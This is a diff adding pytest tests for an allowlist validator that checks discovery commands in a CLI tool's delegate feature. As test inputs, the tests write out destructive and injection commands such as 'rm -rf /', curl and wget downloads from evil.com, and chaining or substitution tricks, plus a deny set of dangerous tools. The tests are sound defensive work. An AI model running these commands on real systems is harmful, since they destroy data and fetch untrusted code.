@@ -1,8 +1,18 @@
 """Tests for delegate command helper functions."""
 
+import pytest
 from unittest.mock import patch
 
-from emdx.commands.delegate import _slugify_title, _resolve_task, PR_INSTRUCTION
+from click.exceptions import Exit as ClickExit
+
+from emdx.commands.delegate import (
+    _slugify_title,
+    _resolve_task,
+    _validate_discovery_command,
+    _run_discovery,
+    PR_INSTRUCTION,
+    SAFE_DISCOVERY_COMMANDS,
+)
 
 
 class TestSlugifyTitle:
@@ -90,3 +100,182 @@ class TestPRInstruction:
 
     def test_pr_instruction_mentions_pr_create(self):
         assert "gh pr create" in PR_INSTRUCTION
+
+
+class TestValidateDiscoveryCommand:
+    """Tests for _validate_discovery_command — security validation for --each commands.
+
+    SECURITY: These tests verify that command injection attacks are prevented.
+    The discovery command feature must ONLY allow safe, read-only commands.
+    """
+
+    # === ALLOWED COMMANDS (should pass) ===
+
+    def test_fd_command_allowed(self):
+        args, use_shell = _validate_discovery_command("fd -e py src/")
+        assert args == ["fd", "-e", "py", "src/"]
+        assert use_shell is False
+
+    def test_find_command_allowed(self):
+        args, _ = _validate_discovery_command("find . -name '*.py'")
+        assert args[0] == "find"
+
+    def test_git_ls_files_allowed(self):
+        args, _ = _validate_discovery_command("git ls-files '*.py'")
+        assert args[0] == "git"
+
+    def test_rg_files_allowed(self):
+        args, _ = _validate_discovery_command("rg --files src/")
+        assert args[0] == "rg"
+
+    def test_ls_allowed(self):
+        args, _ = _validate_discovery_command("ls -la src/")
+        assert args[0] == "ls"
+
+    def test_eza_allowed(self):
+        args, _ = _validate_discovery_command("eza --oneline")
+        assert args[0] == "eza"
+
+    def test_jq_allowed(self):
+        args, _ = _validate_discovery_command("jq '.files[]' config.json")
+        assert args[0] == "jq"
+
+    def test_grep_allowed(self):
+        args, _ = _validate_discovery_command("grep -l TODO src/")
+        assert args[0] == "grep"
+
+    def test_full_path_command_allowed(self):
+        """Commands with full paths should work if base name is allowed."""
+        args, _ = _validate_discovery_command("/usr/bin/fd -e py")
+        assert args[0] == "/usr/bin/fd"
+
+    def test_echo_allowed(self):
+        """Echo is allowed for simple item generation."""
+        args, _ = _validate_discovery_command("echo 'item1\nitem2'")
+        assert args[0] == "echo"
+
+    # === BLOCKED COMMANDS (should raise typer.Exit) ===
+
+    def test_rm_blocked(self):
+        """rm is NOT in the allowlist and should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("rm -rf /")
+
+    def test_curl_blocked(self):
+        """curl is NOT in the allowlist and should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("curl https://evil.com/script.sh")
+
+    def test_wget_blocked(self):
+        """wget is NOT in the allowlist and should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("wget https://evil.com/malware")
+
+    def test_python_blocked(self):
+        """python/python3 are NOT in the allowlist and should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("python -c 'import os; os.system(\"rm -rf /\")'")
+
+    def test_bash_blocked(self):
+        """bash is NOT in the allowlist and should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("bash -c 'rm -rf /'")
+
+    def test_sh_blocked(self):
+        """sh is NOT in the allowlist and should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("sh -c 'rm -rf /'")
+
+    # === COMMAND INJECTION ATTEMPTS (should raise typer.Exit) ===
+
+    def test_semicolon_injection_blocked(self):
+        """Semicolon command chaining should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("fd -e py; rm -rf /")
+
+    def test_ampersand_injection_blocked(self):
+        """Ampersand command chaining should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("fd -e py && rm -rf /")
+
+    def test_pipe_injection_blocked(self):
+        """Pipe command chaining should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("fd -e py | xargs rm")
+
+    def test_backtick_injection_blocked(self):
+        """Backtick command substitution should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("fd `rm -rf /`")
+
+    def test_dollar_paren_injection_blocked(self):
+        """$(cmd) command substitution should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("fd $(rm -rf /)")
+
+    def test_dollar_var_blocked(self):
+        """$VAR expansion should be blocked to prevent env leakage."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("echo $HOME")
+
+    def test_redirect_to_absolute_path_blocked(self):
+        """Redirecting to absolute paths should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("fd -e py > /etc/passwd")
+
+    # === EDGE CASES ===
+
+    def test_empty_command_blocked(self):
+        """Empty commands should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("")
+
+    def test_whitespace_only_command_blocked(self):
+        """Whitespace-only commands should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("   ")
+
+    def test_invalid_syntax_blocked(self):
+        """Invalid shell syntax should be blocked."""
+        with pytest.raises(ClickExit):
+            _validate_discovery_command("fd 'unclosed quote")
+
+    def test_quoted_args_preserved(self):
+        """Quoted arguments should be properly parsed."""
+        args, _ = _validate_discovery_command("find . -name '*.py'")
+        assert "*.py" in args  # Quote stripped, glob preserved
+
+
+class TestRunDiscovery:
+    """Tests for _run_discovery — actually running discovery commands."""
+
+    def test_successful_discovery_returns_lines(self):
+        """A successful echo command should return lines."""
+        # Use echo which is in the allowlist
+        result = _run_discovery("echo 'line1\nline2\nline3'")
+        assert len(result) == 3
+        assert "line1" in result
+
+    def test_injection_attempt_blocked_before_execution(self):
+        """Command injection should be blocked before subprocess is called."""
+        with pytest.raises(ClickExit):
+            _run_discovery("echo test; rm -rf /")
+
+    def test_dangerous_command_blocked_before_execution(self):
+        """Non-allowlisted commands should be blocked before subprocess."""
+        with pytest.raises(ClickExit):
+            _run_discovery("curl https://evil.com")
+
+
+class TestSafeDiscoveryCommands:
+    """Tests for the SAFE_DISCOVERY_COMMANDS allowlist."""
+
+    def test_allowlist_contains_common_tools(self):
+        """Verify common discovery tools are in the allowlist."""
+        expected = {"fd", "find", "git", "rg", "ls", "grep", "jq"}
+        assert expected.issubset(SAFE_DISCOVERY_COMMANDS)
+
+    def test_allowlist_excludes_dangerous_tools(self):
+        """Verify dangerous tools are NOT in the allowlist."""
+        dangerous = {"rm", "mv", "cp", "curl", "wget", "python", "bash", "sh", "sudo"}
+        assert not dangerous.intersection(SAFE_DISCOVERY_COMMANDS)
